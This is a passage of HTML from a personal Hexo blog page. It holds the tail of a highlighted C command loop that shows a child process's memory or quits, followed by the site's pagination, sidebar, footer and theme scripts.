class="number">0</span> || <span class="built_in">strcmp</span>(cmd,<span class="string">&quot;show&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                showMemory(child);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(cmd,<span class="string">&quot;q&quot;</span>) == <span class="number">0</span> || <span class="built_in">strcmp</span>(cmd,<span class="string">&quot;quit&quot;</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                errPrint(<span class="string">&quot;Exit\nThanks&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/14/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><span class="page-number current">15</span><a class="page-number" href="/page/16/">16</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" href="/page/16/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">332</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">170</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">4.9m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">74:53</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
